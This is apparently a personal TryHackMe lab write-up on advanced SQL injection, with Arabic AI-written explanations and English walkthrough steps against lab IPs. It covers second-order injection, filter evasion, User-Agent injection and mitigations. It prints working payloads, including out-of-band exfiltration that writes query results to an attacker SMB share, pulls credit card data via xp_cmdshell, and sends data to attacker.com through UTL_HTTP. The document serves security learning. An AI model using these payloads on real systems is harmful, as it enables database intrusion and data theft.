# Advanced SQL Injection

<details>
  <summary>Introduction</summary>

  > ﻿Throughout this room, you will gain a comprehensive understanding of the following key concepts:
- >> Second-order SQL injection 
- >> Filter evasion
- >> Out-of-band SQL Injection
- >> Automation techniques
- >> Mitigation measures

- > **``First``** scan
  >
  > ```
  > nmap -A -T4 -p 3306,3389,445,139,135 10.10.108.30
  > ```
  >

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-01 14:35 EDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 20.00% done; ETC: 14:36 (0:00:24 remaining)
Nmap scan report for 10.10.108.30
Host is up (0.11s latency).

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.23 or earlier (unauthorized)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-01T18:36:10+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SQLi
| Not valid before: 2025-04-30T18:34:14
|_Not valid after:  2025-10-30T18:34:14
| rdp-ntlm-info: 
|   Target_Name: SQLI
|   NetBIOS_Domain_Name: SQLI
|   NetBIOS_Computer_Name: SQLI
|   DNS_Domain_Name: SQLi
|   DNS_Computer_Name: SQLi
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-01T18:36:00+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 (96%), Microsoft Windows Server 2019 (96%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows 10 1903 (92%), Windows Server 2019 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Vista SP1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-01T18:36:02
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   140.13 ms 10.8.0.1
2   127.52 ms 10.10.108.30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.57 seconds

```

- > mysql run on **``3306``**


</details>










--------------------------------------------------------------------------------------------------------------------------------------------------










<details>
  <summary>Recap</summary>

![image](https://github.com/user-attachments/assets/c6ced0d7-d8d3-4b5e-8aea-d80d42831e45)

  
</details>

--------------------------------------------------------------------------------------------------------------------------------------------------

<details>
  <summary>Second-Order SQL Injection</summary>

<details>
  <summary>GPT--explain</summary>
  
# Second-Order SQL Injection

Second-Order SQL Injection (SQLi) هو نوع من أنواع هجمات SQL التي لا يتم تنفيذها في لحظة إدخال البيانات كما هو الحال مع SQLi التقليدي. بدلاً من ذلك، يتم إدخال كود خبيث يُخزن بشكل طبيعي في قاعدة البيانات، ثم يُنفذ لاحقًا عند استخدام هذه البيانات في استعلام SQL جديد بدون حماية كافية.

---

## 🧠 مثال توضيحي

### 💾 1. صفحة `add.php` (إدخال البيانات)

المهاجم يدخل البيانات التالية:

- `SSN`: `12345'; UPDATE books SET book_name = 'Hacked'; --`
- `book_name`: `Normal Book`
- `author`: `John Doe`

الكود يُخزن كما هو داخل قاعدة البيانات دون تنفيذ أي أوامر SQL، لأنه لا يُستخدم في استعلام أثناء الإدخال.

---

### 🔁 2. صفحة `update.php` (استخدام البيانات لاحقًا)

الكود التالي يستخدم البيانات المخزنة:

```php
$update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
```

إذا كانت قيمة `$ssn` هي القيمة التي أدخلها المهاجم سابقًا، فإن هذا الاستعلام يصبح استعلامًا مركبًا يؤدي إلى تنفيذ الكود الخبيث.

### 💣 النتيجة

- يتم تنفيذ الأمر الثاني داخل الاستعلام: `UPDATE books SET book_name = 'Hacked';`
- أسماء كل الكتب في الجدول قد تتغير إلى "Hacked".

---

## ⚠️ لماذا هذا النوع خطير؟

- يمر من عمليات الفلترة التقليدية مثل `real_escape_string()`.
- لا يسبب مشاكل ظاهرة وقت الإدخال، مما يجعله صعب الاكتشاف.
- يتم تنفيذه في وقت لاحق في مكان مختلف في الكود.

---

## 🔐 كيف نحمي التطبيق؟

### ✅ استخدام Prepared Statements (الاستعلامات المجهزة)

```php
$stmt = $conn->prepare("UPDATE books SET book_name = ?, author = ? WHERE ssn = ?");
$stmt->bind_param("sss", $book_name, $author, $ssn);
$stmt->execute();
```

### ✅ فلترة البيانات عند الإدخال **وعند الاستخدام**

- لا تكتفِ بالتحقق عند الإدخال فقط.
- تحقق من صحة وسلامة البيانات قبل استخدامها في أي استعلام.

### ❌ تجنب استخدام `multi_query()` إن أمكن

- لأنه يسمح بتنفيذ أكثر من أمر SQL في استعلام واحد، مما يسهل تنفيذ الأكواد الخبيثة.

---

## 📊 تسلسل الهجوم (وصف توضيحي)

```
[User Input] --> (add.php) --> [Stored in DB] --> (update.php uses it unsafely) --> [SQL Injection Triggered]
```

---

Second-Order SQLi مثال قوي على أن الأمان لا يجب أن يعتمد فقط على الإدخال النظيف، بل أيضًا على كيفية استخدام البيانات لاحقًا.


</details>


- > first we will add new book on this ``http://10.10.84.232/second/add.php`` like this:
  > 
  > ![image](https://github.com/user-attachments/assets/4088c1e0-64fc-4dca-b5cf-cddffd17176c)
  > 
  > we make book ``SSN`` content ``12345'; UPDATE books SET book_name = 'Hacked'; --``
  > 
  > it will not excuted now
  >
  > now we open **``http://10.10.84.232/second/update.php``** and update content of this book
  >
  > ![image](https://github.com/user-attachments/assets/b03e0b64-42f6-405d-812d-5fb3be5888cf)
  >
  > if we go back to ``add.php`` will found all books name became **``hacked``**
  >
  > ![image](https://github.com/user-attachments/assets/6594fef7-009d-4cee-a91f-b68c82ce188b)
  >
  > we can also drop tables or any other sql queryies 




</details>

--------------------------------------------------------------------------------------------------------------------------------------------------


<details>
  <summary>Filter Evasion Techniques</summary>

<details>
  <summary>GPT--explain</summary>

# SQL Injection: Bypassing Weak Filters

## 🎯 الفكرة الأساسية
بعض المطورين يحاولون منع هجمات SQL Injection عن طريق فلترة كلمات خطيرة مثل `OR`, `AND`, `UNION`, `SELECT` من مدخلات المستخدم. لكن هذه الطريقة غير كافية ويمكن تجاوزها باستخدام تقنيات ترميز مختلفة.

---

## 🧱 مثال على كود ضعيف للحماية:

```php
$special_chars = array("OR", "or", "AND", "and" , "UNION", "SELECT");
$book_name = str_replace($special_chars, '', $book_name);
```

الكود يقوم بإزالة الكلمات المحظورة من المدخلات. فإذا أدخل المستخدم:
```
admin' OR 1=1
```
فإنها تتحول إلى:
```
admin' 1=1
```
وبالتالي قد يفشل الهجوم. لكن... 👇

---

## 💥 كيف يتجاوز الهاكر الفلترة؟

### ✅ 1. URL Encoding (ترميز الروابط)

الهجوم:
```
admin' OR 1=1 --
```
يُكتب كالتالي:
```
admin%27%20OR%201%3D1%20--+
```
الفلتر لا يتعرف على `%27` كعلامة اقتباس `'`، لكنها تُفك عند التنفيذ.

---

### ✅ 2. استخدام `||` بدل `OR`

في MySQL:
```sql
1' || 1=1 --+
```
`||` تعمل كبديل لـ `OR`. الفلتر لا يراها خطيرة لكنها تؤدي نفس الغرض.

---

### ✅ 3. Hex Encoding (الترميز بالـ Hex)

كلمة `admin` يمكن كتابتها كالتالي:
```sql
0x61646d696e
```
إذا حاول الفلتر منع كلمة "admin"، هذا الترميز سيتجاوز الحظر.

---

### ✅ 4. Unicode Encoding (الترميز الموحد)

مثال:
```
\u0061\u0064\u006d\u0069\u006e  →  admin
```
بعض البيئات تقوم بتفسير الترميز وتحويله للنص الأصلي تلقائيًا.

---

## 👨‍💻 تطبيقات واقعية معرضة للخطر

- مواقع البحث في الكتب أو المنتجات.
- صفحات تسجيل الدخول واسترجاع كلمات المرور.
- أي نموذج إدخال يعتمد على كلمات يتم فلترتها سطحيًا.

---

## 🛡️ كيف تحمي تطبيقك كمطور؟

- ✅ **استخدم Prepared Statements (استعلامات مجهزة مسبقًا):**
  - تمنع تنفيذ الكود الخبيث مهما كانت طريقة ترميزه.

- ❌ **لا تعتمد على `str_replace` أو Regex فقط:**
  - الترميز قد يخدع هذه الطرق بسهولة.

- 🧠 **افهم أن الترميز لا يغير نية المدخلات:**
  - قاعدة البيانات ستفك الترميز وتنفذ الأوامر.

---

الحماية الحقيقية تأتي من تصميم استعلاماتك بشكل آمن، وليس من مجرد إزالة كلمات معينة من إدخال المستخدم.


  
</details>


- > firts open ``http://10.10.84.232/encoding/``
  >
  > try to use for exmaple ``' or 1=1; --`` this will appear
  >
  > ![image](https://github.com/user-attachments/assets/891418fc-62fd-415a-b15a-bdb20dc11faf)
  >
  > so now will go to burpsuit and send request to ``repeater``
  >
  > and select the input and do url encode to it by click ``ctrl`` **+** ``U``
  >
  > ![image](https://github.com/user-attachments/assets/181147f7-3764-438a-9c65-9fab015278a7)
  >
  > ```
  > http://10.10.84.232/encoding/search_books.php?book_name=intro+to+php%27+||+1%3d1+--+
  > ```




</details>

--------------------------------------------------------------------------------------------------------------------------------------------------


<details>
  <summary>Filter Evasion Techniques (continued)</summary>

<details>
   <summary>GPT--EXPLAN</summary>

# 💣 No-Quote & No-Space SQL Injection

## 🔍 أولًا: يعني إيه No-Quote SQL Injection؟

دي تقنية بنستخدمها لما السيرفر يمنع علامات الاقتباس `'` أو `"`. يعني أي حاجة فيها `' OR '1'='1` مش هتشتغل، لأن السيرفر بيعمل escape لها أو بيحذفها.

---

## ✅ إزاي نعدي الفلتر ده؟

### 1. استخدام الأرقام بدل النصوص:
```sql
... WHERE id = 1 OR 1=1 --
```
✅ الأرقام لا تحتاج علامات اقتباس، فتعدي بسهولة.

### 2. استخدام التعليقات لتعطيل باقي الاستعلام:
```sql
admin--
```
✅ أي شيء بعد `--` لا يُنفذ.

### 3. بناء كلمات باستخدام دوال SQL:
```sql
CONCAT(0x61, 0x64, 0x6D, 0x69, 0x6E) = "admin"
```
✅ تجاوز لكلمة "admin" بدون كتابتها مباشرة.

---

## 🚫 No-Space SQL Injection (المسافات ممنوعة)

بعض الفلاتر تمنع المسافات كإجراء أمني إضافي.

### ✅ كيف نتجاوز منع المسافات؟

#### 1. استخدام تعليقات مكان المسافات:
```sql
SELECT/**/username/**/FROM/**/users/**/WHERE/**/1=1
```
✅ `/**/` تُعامل كمسافة من قِبل المحرك SQL.

#### 2. استخدام ترميزات للمسافات:

| Character | Meaning               |
|-----------|------------------------|
| `%09`     | Tab                   |
| `%0A`     | Line Feed (New Line) |
| `%0D`     | Carriage Return      |
| `%0C`     | Form Feed            |
| `%A0`     | Non-breaking Space   |

### 💡 مثال عملي:

رابط:
```arduino
http://10.10.84.232/space/search_users.php?username=?
```

الكود في الخلفية:
```php
$special_chars = array(" ", "AND", "and", "or", "OR" , "UNION", "SELECT");
$username = str_replace($special_chars, '', $username);
```

#### ❌ Payload فاشل:
```vbnet
1' OR 1=1 --
```

#### ✅ Payload ناجح:
```matlab
1'%0A||%0A1=1%0A--%27+
```

> `%0A` = سطر جديد، `||` = بديل `OR`، `%27` = `'`, `--` = تعليق

---

## 🧠 الخلاصة: (تلخيص تقنيات التجاوز)

| السيناريو                     | الحل                                                   |
|------------------------------|--------------------------------------------------------|
| كلمات محجوبة (SELECT...)     | `SElEcT`, `SE/**/LECT`, استخدام `CHAR()` أو `CONCAT()` |
| المسافات ممنوعة             | استخدم `%09`, `%0A`, `/**/`, `+`, `\t`, `\n`           |
| Quotes ممنوعة               | استخدم أرقام، دوال نصوص، أو بدون Quotes               |
| `AND` / `OR` ممنوعة         | استخدم `&&`, `` ` ``, أو `||`                          |
| ترميز UTF أو Hex            | `CHAR(0x41)`, `CONCAT(0x61,0x64,0x6D)`                  |

---

## 🧪 نصيحة ميدانية:

- ✅ لازم تجرب، تفشل، وتحاول تاني.
- ✅ مفيش فلتر أو WAF بيقدر يمنع كل الطرق.
- ✅ كل بيئة ليها سلوك مختلف، لازم تفكر زي مخترق ذكي.

> الحماية الذكية = استعلامات مجهزة مسبقًا + فهم عميق للثغرات.


  
</details>


- > **``10.10.84.232/space/search_users.php?username=attacker``**



</details>

--------------------------------------------------------------------------------------------------------------------------------------------------



<details>
  <summary>Out-of-band SQL Injection</summary>

<details>
  <summary>GPT--explain</summary>

## 🎯 يعني إيه OOB SQL Injection؟

الـ SQL Injection العادي (In-band) هو لما تبعت كود خبيث في الـ input (زي حقل بحث أو login)، والنتيجة بترجعلك في نفس الصفحة. لكن في بعض الحالات، السيرفر بيمنع الرد المباشر أو بيكون فيه جدار ناري (Firewall) أو IDS بيوقف أي رد غير طبيعي.

⬅️ هنا بييجي دور **Out-of-Band SQLi (OOB SQLi)**:
هو ببساطة إنك تبعت الكود الخبيث، والبيانات ترجعلك من طريق مختلف (زي DNS أو HTTP أو SMB).

---

## ⚙️ إزاي بيشتغل OOB SQL Injection؟

أنت بتقول لقاعدة البيانات: "مش لازم ترد عليا هنا… ابعتي البيانات دي على عنوان تاني أنا بتحكم فيه."

---

## ✅ ليه نستخدم OOB؟

* لما السيرفر ما بيرجعش أي بيانات مباشرة أو الرد متشفر.
* لما فيه WAF/IDS بيراقب ويمنع استجابات غير طبيعية.
* لما السيرفر ورا جدار ناري ومفيش اتصال مباشر بينك وبينه.

---

## 💡 أشهر الطرق المستخدمة حسب نوع قاعدة البيانات:

### 🔸 MySQL / MariaDB:

```sql
SELECT secret_data FROM users 
INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt';
```

* يكتب النتيجة في ملف على السيرفر.
* يمكن الكتابة على SMB Share خارجي.

### 🔸 MSSQL:

```sql
EXEC xp_cmdshell 'bcp "SELECT credit_card FROM users" queryout "\\\\10.10.58.187\\logs\\cards.txt" -c -T';
```

* يستخدم أوامر النظام عبر xp\_cmdshell.

### 🔸 Oracle:

```sql
BEGIN
  UTL_HTTP.BEGIN_REQUEST('http://attacker.com?data=' || secret_data);
END;
```

* يستخدم UTL\_HTTP أو UTL\_FILE لإرسال البيانات.

---

## 🔍 طرق النقل المختلفة:

1. **SMB Exfiltration**

   * السيرفر يكتب ملف على SMB Share بتاعك.

2. **HTTP Requests**

   * لو قاعدة البيانات تدعم إرسال HTTP (زي Oracle).

3. **DNS Exfiltration**

   * ترسل البيانات مشفرة كـ DNS query. يتطلب DNS Server خاص بيك.

---

## 🧪 سيناريو عملي من TryHackMe (مثال SMB OOB):

### 🧱 الوضع:

رابط فيه SQLi:

```
http://MACHINE_IP/oob/search_visitor.php?visitor_name=Tim
```

الكود في الخلفية:

```php
$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
```

### 🎯 الهدف:

نخرج بيانات قاعدة البيانات (زي إصدارها) باستخدام SMB.

### 🚀 الخطوات:

1. **شغل SMB Server على AttackBox**

```bash
cd /opt/impacket/examples
python3.9 smbserver.py -smb2support logs /tmp
```

2. **جهّز البايلود:**

```sql
1'; SELECT @@version INTO OUTFILE '\\\\ATTACKBOX_IP\\logs\\out.txt'; --
```
> ``ATTACKBOX_IP`` is tun0 IP



3. **ملاحظة مهمة:**
   في MySQL فيه متغير `secure_file_priv`:

* لو متعيّن على فولدر → مش هتقدر تكتب غير فيه.
* لو فاضي → تقدر تكتب في أي مكان.

أماكن بديلة: `/var/lib/mysql-files/` أو `/tmp/`

4. **عرض الملف على SMB:**

```bash
smbclient //ATTACKBOX_IP/logs -U guest -N
ls
```

---

## ✅ خلاصة:

* OOB SQLi = تبعت كود خبيث والداتا ترجعلك من قناة تانية (DNS, HTTP, SMB).
* مفيد لما يكون السيرفر مقفول أو فيه WAF.
* لازم تجهز سيرفر خارجي تستقبل عليه البيانات.


</details>


- > first ``lcate`` **smbserver.py**
  >
  > ```
  > locate smbserver.py
  > ```
  >
  > ```
  > /usr/lib/python3/dist-packages/impacket/smbserver.py
  > /usr/lib/python3/dist-packages/scapy/layers/smbserver.py
  > /usr/share/doc/python3-impacket/examples/smbserver.py
  > ```
  > after this lesten using this
  >
  > ```
  > python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp
  > ```
  >
  > and open
  >
  > ```
  > http://10.10.118.35/oob/search_visitor.php?visitor_name=1%27;%20SELECT%20@@version%20INTO%20OUTFILE%20%27\\\\10.8.47.102\\logs\\out.txt%27;%20--
  > ```
  >
  > now if we go to **``/tmp/``** will find
  >
  > ```
  > 
  > MozillaUpdateLock-6F44D7866C515FB4
  > out.txt
  > snap-private-tmp
  > ssh-hANM0kFepfUI
  > systemd-private-e6b60fac0cdb4058be212246d60424e0-apache2.service-y0ADPx
  > systemd-private-e6b60fac0cdb4058be212246d60424e0-colord.service-U9islR
  > systemd-private-e6b60fac0cdb4058be212246d60424e0-fwupd.service-FVxt1L
  > ```
  >
  > ```
  > cat out.txt
  > ```
  >
  > ```
  > 10.4.24-MariaDB
  > ```
  >
  > done 😝
  >
  > now to know  @@basedir
  >
  > ```
  > http://10.10.118.35/oob/search_visitor.php?visitor_name=1%27;%20SELECT%20@@basedir%20INTO%20OUTFILE%20%27\\\\10.8.47.102\\logs\\out1.txt%27;%20--
  > ```
  >
  > if we open ``/tmp/`` will found ``out1.txt``
  >
  > ```
  > cat out1.txt
  > ```
  >
  > ```
  > C:/xampp/mysql
  > ```
  > 


</details>

--------------------------------------------------------------------------------------------------------------------------------------------------



<details>
  <summary>Other Techniques</summary>

<details>
   <summary>GPT--explain</summary>

## 🧠 1. HTTP Header Injection (User-Agent Injection)

### ✅ الفكرة العامة:

بعض التطبيقات بتسجّل أو تستخدم بيانات الـ HTTP Headers (زي User-Agent, Referer, X-Forwarded-For) مباشرة في قواعد البيانات أو الاستعلامات بدون تعقيم، وده بيفتح الباب لـ SQL Injection.

### 💥 مثال توضيحي:

```http
User-Agent: ' UNION SELECT username, password FROM user; #
```

إذا التطبيق بيستخدم القيمة دي في SQL query:

```php
$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent';"
```

كده القيمة بتُدرج حرفيًا في الاستعلام، ولو فيها كود SQL هيتنفذ.

### 📌 خطورة السيناريو:

لو التطبيق بيعرض نتيجة هذا الاستعلام في صفحة (زي /httpagent/)، المهاجم يقدر يشوف البيانات اللي تم حقنها.

### ⚖️ أدوات التنفيذ:

* **Burp Suite** (لتعديل الهيدر بسهولة)
* **curl**:

```bash
curl -H "User-Agent: ' UNION SELECT username, password FROM user; #" http://MACHINE_IP/httpagent/
```

---

## 🧠 2. Stored Procedure Injection

### ✅ الفكرة العامة:

Stored Procedures هي دوال محفوظة داخل قاعدة البيانات. لو استخدمت إدخال المستخدم داخل Dynamic SQL، ممكن تؤدي لـ SQL Injection.

### 💥 مثال توضيحي:

```sql
CREATE PROCEDURE sp_getUserData 
    @username NVARCHAR(50)
AS 
BEGIN 
    DECLARE @sql NVARCHAR(4000)
    SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
    EXEC(@sql)
END
```

لو مهاجم أرسل:

```sql
' OR '1'='1
```

هيتنفذ:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'
```

### ✅ الحل الأمني:

استخدم Parameterized Queries:

```sql
CREATE PROCEDURE sp_getUserData
    @username NVARCHAR(50)
AS
BEGIN
    SELECT * FROM users WHERE username = @username
END
```

---

## 🧪 3. JSON / XML Injection

### ✅ الفكرة العامة:

لو التطبيق بيستقبل JSON أو XML، ويستخدم القيم في SQL بدون تعقيم، ممكن يحصل SQL Injection.

### 📺 JSON Injection:

#### ⭐ السيناريو:

```json
{
  "username": "admin",
  "password": "123456"
}
```

المهاجم يرسل:

```json
{
  "username": "admin' OR '1'='1--",
  "password": "irrelevant"
}
```

#### 💥 النتيجة:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'irrelevant'
```

### 📺 XML Injection:

#### ⭐ السيناريو:

```xml
<user>
  <username>admin' OR '1'='1</username>
  <password>test</password>
</user>
```

#### 💥 النتيجة:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

### ✅ الحل الأمني:

* تعقيم كل المدخلات.
* استخدم Prepared Statements.
* استخدم مكتبات آمنة للتعامل مع JSON وXML.

---

## ✅ الخلاصة:

| الهجوم                     | السبب                             | الحل                                 |
| -------------------------- | --------------------------------- | ------------------------------------ |
| HTTP Header Injection      | استخدام قيمة الهيدر مباشرة في SQL | استخدام تعقيم أو Prepared Statements |
| Stored Procedure Injection | Dynamic SQL بدون باراميتر         | استخدام باراميتر داخل الـ Procedure  |
| JSON / XML Injection       | بناء SQL من بيانات JSON/XML       | Prepared Statements وتعقيم القيم     |


</details>


- >
  > ```
  > curl -H "User-Agent: ' UNION SELECT flag,book_id FROM books; # " http://10.10.45.81/httpagent/
  > ```
  >
  > found
  >
  > ```
  > THM{HELLO}
  > ```
  >



</details>

--------------------------------------------------------------------------------------------------------------------------------------------------




<details>
  <summary>Automation</summary>

<details>
  <summary>GPT--EXPLAIN</summary>


# SQL Injection - الهجوم ده بيحصل ليه؟

الـ SQL Injection هو نوع من الهجوم اللي بيستغل ضعف في التطبيق أو الموقع، عشان يقدر يدخل أكواد SQL خبيثة في استعلامات (queries) قاعدة البيانات، وده ممكن يسمح له بالوصول للبيانات أو تعديلها بدون إذن.

## التحديات اللي بتواجهنا في اكتشاف SQL Injection

### 1. الاستعلامات الديناميكية:
الاستعلامات دي بتتكون حسب المدخلات اللي بيدخلها المستخدم. يعني لو المستخدم دخل قيمة معينة، الاستعلام بيتم تكوينه بناءً على المدخل ده.

**المشكلة هنا:**
الاستعلامات المعقدة دي بتخلي من الصعب اكتشاف أماكن الثغرات بسهولة.

**مثال:**
إذا عندنا استعلام زي ده:

```php
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

لو المستخدم دخل:

```plaintext
' OR 1=1 --
```

الاستعلام هيكون كده:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 -- AND password = '';
```

ده هيسمح للمهاجم بالوصول لبيانات المستخدمين.

### 2. أنواع مختلفة من نقاط الحقن:
الثغرات دي ممكن تظهر في أماكن كتير:
- المدخلات النصية (مثل: الحقول في النماذج)
- رؤوس الـ HTTP (مثل: User-Agent, Referer)
- المعلمات في URL (مثل: http://example.com?id=1)

الـ SQL Injection مش دايمًا هتحصل في نفس المكان، ولازم نفحص كل جزء في التطبيق.

### 3. استخدام تدابير الأمان:
بعض التطبيقات بتستخدم prepared statements أو parameterized queries عشان تتجنب الثغرات دي. يعني بدل ما تكون الاستعلامات فيها قيم مباشرة، بيتم استخدام معلمات (parameters) بتكون أكثر أمانًا.

**مثال:**

```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

الطريقة دي بتخلي من الصعب على المهاجم أن يدخل أكواد SQL خبيثة.

### 4. الاكتشاف حسب السياق:
الأدوات اللي بنستخدمها لازم تكون ذكية عشان تقدر تحدد الـ SQL Injection في السياقات المختلفة. يعني لازم تكون قادرة على التمييز بين الأماكن الآمنة وغير الآمنة في التطبيق.

## الأدوات المهمة لاكتشاف SQL Injection

فيه أدوات كتير بتساعدنا نكتشف SQL Injection، هنا بعض من الأدوات المهمة:

### 1. SQLMap
SQLMap هو أداة مفتوحة المصدر بتساعد في اكتشاف واستغلال ثغرات SQL Injection بشكل تلقائي.

- بتدعم مجموعة كبيرة من قواعد البيانات.
- ممكن تشغلها بسهولة وتستخدمها لاكتشاف الثغرات.

### 2. SQLNinja
SQLNinja هي أداة تانية بتخصصها لاكتشاف SQL Injection في المواقع اللي بتستخدم Microsoft SQL Server كقاعدة بيانات.

### 3. JSQL Injection
دي مكتبة بلغة Java بتساعدك تكتشف SQL Injection في التطبيقات المبنية على Java.

### 4. BBQSQL
BBQSQL هي أداة لاختبار Blind SQL Injection. يعني بتساعدك تكشف الثغرات دي حتى لو ما بتظهرلكش رسائل خطأ.

## الخلاصة:
أدوات زي SQLMap و SQLNinja بتسهل اكتشاف واستغلال ثغرات SQL Injection.

لكن لازم نفهم إن الأدوات دي مش كفاية لوحدها. لازم نعمل فحص يدوي للتأكد من الأمان.

استخدام تقنيات زي prepared statements و parameterized queries بتقلل فرص حدوث SQL Injection.


</details>




</details>

--------------------------------------------------------------------------------------------------------------------------------------------------




<details>
  <summary>beast practice</summary>

<details>
   <summary>GPT--explain</summary>


# 1. للمطورين (Secure Coders)

## استعلامات معلماتية (Parameterized Queries)
يعني بدل ما تكتب الاستعلامات مع المدخلات بشكل مباشر، تكتبها في شكل ثابت، وتضيف القيم بشكل آمن.

**مثال:**
لو عندك استعلام لاسترجاع مستخدم:

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
```

هنا القيمة `:username` يتم استبدالها بشكل آمن بالمدخل المرسل، وبالتالي مفيش خطر من SQL injection.

## التحقق من المدخلات وتنظيفها (Input Validation and Sanitisation)
يعني تتأكد من أن المدخلات التي يدخلها المستخدم صحيحة. مثلًا، لو المستخدم يدخل رقم تليفون، تأكد أنه يحتوي على أرقام فقط.

**مثال في PHP:**

```php
htmlspecialchars($input);  // لتنظيف المدخلات من أكواد HTML ضارة.
filter_var($email, FILTER_VALIDATE_EMAIL);  // للتحقق من أن البريد الإلكتروني صحيح.
```

## مبدأ أقل امتياز (Least Privilege Principle)
يعني تعطي الصلاحيات للحسابات المستخدمة في التطبيق أقل قدر من الصلاحيات الضرورية.

**مثال:** ما تستخدمش حسابات لها صلاحيات كبيرة مثل ADMIN إلا لو ضروري، لتقليل الضرر في حالة حدوث هجوم.

## الإجراءات المخزنة (Stored Procedures)
الإجراءات المخزنة هي كود SQL جاهز موجود في قاعدة البيانات. بدل ما تكتب استعلامات في التطبيق، استخدم إجراءات مخزنة يمكنها التحقق من المدخلات بشكل آمن.

## مراجعة الكود والتدقيق الأمني (Security Audits and Code Reviews)
يعني تراجع الكود بشكل دوري وتبحث عن الثغرات الأمنية. استخدم أدوات لفحص الكود تلقائيًا لكن أيضًا راجع يدويًا لأنه قد يكون هناك أخطاء صغيرة.

---

# 2. لفاحصي الثغرات (Pentesters)

## استغلال ميزات قواعد البيانات الخاصة (Exploiting Database-Specific Features)
كل قاعدة بيانات لها ميزات خاصة. لو فهمت هذه الميزات، تستطيع استخدامها لاستغلال الثغرات.

**مثال:** في MSSQL، يمكنك استخدام `xp_cmdshell` لتنفيذ أوامر النظام.

## استغلال رسائل الخطأ (Leveraging Error Messages)
لو التطبيق يعطي رسائل خطأ مفصلة، يمكنك استغلالها للحصول على معلومات عن قاعدة البيانات.

**مثال:** عند محاولة إدخال استعلام خاطئ، قد يظهر لك إصدار قاعدة البيانات أو هيكلها.

## تجاوز جدران الحماية (Bypassing WAF and Filters)
إذا كان هناك جدار حماية (WAF) أو فلاتر تمنع الهجمات، يمكن تجاوزها باستخدام تقنيات مثل تغيير الحروف أو الترميز بشكل غير تقليدي.

**مثل:** `SELECT` قد تكتبها كـ `SeLeCt` أو تستخدم الترميز العكسي (URL encoding).

## تمييز قاعدة البيانات (Database Fingerprinting)
لازم تعرف نوع قاعدة البيانات المستهدفة. كل قاعدة بيانات تختلف في الاستعلامات، زي:

- `SELECT version()` في PostgreSQL.
- `SELECT @@version` في MySQL و MSSQL.

## التنقل باستخدام SQL Injection (Pivoting)
بعد الوصول لقاعدة البيانات، قد تتمكن من استخدامه لاختراق أنظمة أخرى داخل الشبكة، مثلًا استخراج كلمات المرور أو الوصول لخوادم أخرى.

---

# الخلاصة

- **للمطورين**: اتبع طرق آمنة في كتابة الكود مثل استعلامات معلماتية و التحقق من المدخلات لتجنب الثغرات.
- **لفاحصي الثغرات**: اعرف تفاصيل قاعدة البيانات وأنت تستخدمها للوصول لأقصى استغلال ممكن للثغرات.

  
</details>

</details>

--------------------------------------------------------------------------------------------------------------------------------------------------





